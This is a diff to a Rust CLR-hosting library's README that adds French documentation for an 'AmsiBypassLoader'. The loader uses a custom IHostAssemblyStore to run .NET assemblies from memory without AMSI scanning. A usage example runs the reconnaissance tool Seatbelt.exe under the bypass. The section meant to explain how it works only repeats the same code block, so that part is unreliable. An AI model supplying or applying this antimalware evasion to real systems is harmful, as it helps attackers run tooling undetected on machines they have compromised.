@@ -161,3 +161,72 @@ fn main() -> Result<(), String> {
 You can use the building blocks provided by `ClrOxide` to patch `System.Environment.Exit` as described in [Massaging your CLR: Preventing Environment.Exit in In-Process .NET Assemblies](https://www.mdsec.co.uk/2020/08/massaging-your-clr-preventing-environment-exit-in-in-process-net-assemblies) by MDSec.  
 
 You can check the reference implementation at [`examples/patch_exit.rs`](examples/patch_exit.rs). Since this requires using `VirtualProtect` or `NtProtectVirtualMemory`, I don't intend to add this as a feature to `ClrOxide`. 
+
+---  
+
+1. primitives/iclrruntimehost.rs (nouveau)
+Interface ICLRRuntimeHost avec SetHostControl pour enregistrer notre host custom.
+
+2. primitives/ihostassemblystore.rs (nouveau)
+Contient toute la magie :
+IHostControl - Le CLR appelle GetHostManager
+IHostAssemblyManager - Retourne notre IHostAssemblyStore
+IHostAssemblyStore - ProvideAssembly retourne un IStream avec les bytes en mémoire
+MemoryStream - Implémentation IStream pour les bytes en mémoire
+AmsiBypassLoader - API haut niveau pour gérer le bypass
+
+3. clr/mod.rs (modifié)
+Ajout de :
+get_context_with_amsi_bypass() - Initialise le CLR avec le bypass
+run_with_amsi_bypass() - Exécute une assembly sans scan AMSI
+run_with_amsi_bypass_no_redirect() - Idem sans redirection output
+
+Exemple d'utilisation
+```
+use clroxide::clr::Clr;
+use clroxide::primitives::AmsiBypassLoader;
+
+fn main() -> Result<(), String> {
+    // Lire les bytes de ton assembly (ex: Seatbelt.exe)
+    let assembly_bytes = std::fs::read("Seatbelt.exe").unwrap();
+    let args = vec!["--all".to_string()];
+
+    // Créer le loader AMSI bypass
+    let mut bypass_loader = AmsiBypassLoader::new();
+
+    // Créer le CLR avec les bytes
+    let mut clr = Clr::new(assembly_bytes, args)?;
+
+    // Exécuter avec bypass AMSI !
+    // L'identité peut être n'importe quoi, c'est juste une clé
+    let output = clr.run_with_amsi_bypass(&mut bypass_loader, "MyAssembly")?;
+
+    println!("{}", output);
+    Ok(())
+}
+```
+
+Comment ça marche
+```
+use clroxide::clr::Clr;
+use clroxide::primitives::AmsiBypassLoader;
+
+fn main() -> Result<(), String> {
+    // Lire les bytes de ton assembly (ex: Seatbelt.exe)
+    let assembly_bytes = std::fs::read("Seatbelt.exe").unwrap();
+    let args = vec!["--all".to_string()];
+
+    // Créer le loader AMSI bypass
+    let mut bypass_loader = AmsiBypassLoader::new();
+
+    // Créer le CLR avec les bytes
+    let mut clr = Clr::new(assembly_bytes, args)?;
+
+    // Exécuter avec bypass AMSI !
+    // L'identité peut être n'importe quoi, c'est juste une clé
+    let output = clr.run_with_amsi_bypass(&mut bypass_loader, "MyAssembly")?;
+
+    println!("{}", output);
+    Ok(())
+}
+```
